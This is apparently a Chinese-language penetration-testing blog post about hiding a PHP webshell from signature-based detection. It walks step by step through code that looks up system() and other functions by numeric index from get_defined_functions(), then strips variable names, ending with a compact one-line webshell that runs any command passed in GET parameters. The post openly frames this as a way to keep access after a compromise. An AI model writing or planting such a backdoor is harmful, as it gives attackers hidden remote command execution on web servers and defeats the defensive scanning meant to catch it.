---
layout:     post
title:      "Using get_defined_functions To Hidden A PHP Backdoor"
date:       2017-08-17
categories: [PHP, Pentest]

---

webshell隐藏是渗透当中一个很重要的权限维持技术，目前也有各种各样的隐藏方法，pen-tester的思路也越来越开放(weisuo)。这篇文章主要记录一下利用get_defined_functions()来隐藏webshell的方法，不是什么新技术，但也值得摸索。

关于get_defined_functions()就不在这里介绍了，大家直接去翻官方文档即可，这里看一下还函数的执行结果应该也能明了。

![func_arry](http://reverse-tcp.xyz/static/img/posts/get_defined_functions/func_arry.png)

以下是一个该函数在webshell里边利用的一个思路，主要是可以隐藏危险函数字符串，而利用正则去文件系统及网络流量上匹配危险函数的安全防护对此也就无效了，先看代码：

```php
<?php
function callfunc() {

    $func = get_defined_functions();  //函数自己完成所有函数的枚举，成为list
    $args = func_get_args();  //获取传入参数值
    $func_id = array_shift($args);  //获取传入的函数所代表的list key
    $func_name = $func['internal'][$func_id];  //以key来索引函数名

    return call_user_func_array($func_name, $args);  //调用回调函数，传参执行
}
print callfunc(460, "whoami");
?>
```

这里自定义了一个callfunc函数，将system函数以索引460传入，并在call_user_func_array()函数执行

![callfunc](http://reverse-tcp.xyz/static/img/posts/get_defined_functions/callfunc.png)

按照这个套路我们继续将*func_get_args()*、*array_shift()*、*call_user_func_array()*也用*get_defined_functions()*来调用，那么就变成了这样

```php
<?php
function callfunc() {

    $func = get_defined_functions();
    $args = $func['internal'][3]();
    $func_id = $func['internal'][805]($args);
    $func_name = $func['internal'][$func_id];

    return $func['internal'][556]($func_name, $args);
}
print callfunc(460, 'whoami');
?>
```

当然也可以是这样

```php
<?php
function callfunc() {

    $func = get_defined_functions()['internal'];
    $args = $func[3]();
    $func_id = $func[805]($args);
    $func_name = $func[$func_id];
    return $func[556]($func_name, $args);
}
print callfunc(460, 'whoami');
?>
```

最后我们将自定义函数名及所有变量名缩短，只留一个核心get_defined_functions()函数即可

```php
<?php
function f() {

    $a = get_defined_functions()['internal'];
    $s = $a[3]();
    $b = $a[805]($s);
    $c = $a[$b];
    return $a[556]($c, $s);
}
print f(460, 'whoami');
?>
```

**无特征webshell**

最后我们将所需要执行的命令及想要使用的函数key以参数方式提交，这样就可以完全避免掉危险函数字符串而不通过任何编码，并且相当自由化，你可以用system可以用exec等等。

```php
<?php function f() { $a = get_defined_functions()['internal'];$s = $a[3]();$b = $a[805]($s);$c = $a[$b];return $a[556]($c, $s); }print f($_GET['id'], $_GET['cmd']);?>
```

![wenshell](http://reverse-tcp.xyz/static/img/posts/get_defined_functions/webshell.png)

